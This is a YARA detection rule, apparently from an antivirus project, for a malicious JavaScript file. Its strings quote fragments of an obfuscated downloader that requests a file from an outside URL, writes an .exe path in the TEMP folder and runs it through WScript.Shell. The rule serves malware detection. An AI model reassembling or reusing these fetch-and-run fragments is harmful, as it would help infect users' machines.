rule sig_20160401_087ff451c0fa36fabf6170023a286168 {
  meta:
    description = "datamaliciousorder - file 20160401_087ff451c0fa36fabf6170023a286168.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0cff5363fcdd0432cdb32a26c72158a40fc84bd8b4058f9ba55e8bd197ab7ccf"

  strings:
    $s1  = "VnLpe[ZzRpb](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function GpiCns(LvgTdu, FvPqn){TiiDz = TiiDz * 1; return LvgTdu - FvPqn;};" fullword ascii
    $s3  = "var DcXtq = function PbvWxs() {return WScript[NqSa](\"WScript\"+\".Shell\");}(), UqtInn = 11;" fullword ascii
    $s4  = "if (VnLpe[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YbWoe() {return DcXtq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"b4EJYAX4aS.ex\" + \"e\";};" fullword ascii
    $s6  = "function PpUqa(){return MgNcw + \"\";};" fullword ascii
    $s7  = "function YfuEor() {return ((JxIu == true) && (JxIu == XdVta)) ? 1 : TiiDz;};" fullword ascii
    $s8  = "var JxIu = false;" fullword ascii
    $s9  = "JxIu = true; " fullword ascii
    $s10 = "var XdVta = false;" fullword ascii
    $s11 = "return GpiCns(DgrQwy, HpfEqc);" fullword ascii
    $s12 = "function JqpKd(LyaAt){DcXtq[\"R\"+\"un\"](LyaAt, TiiDz, TiiDz);};" fullword ascii
    $s13 = "var BuiDwo = new this[\"Date\"]();" fullword ascii
    $s14 = "function SyLv(){return NqSa;};" fullword ascii
    $s15 = "XdVta = true; " fullword ascii
    $s16 = "function YdtTsv(MlnCb) {var MzVag = (1, 2, 3, 4, 5, MlnCb); return MzVag;};" fullword ascii
    $s17 = "}while (JyZii);" fullword ascii
    $s18 = "function NlOa()" fullword ascii
    $s19 = "var SvQtz = false;" fullword ascii
    $s20 = "function KbpUw(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}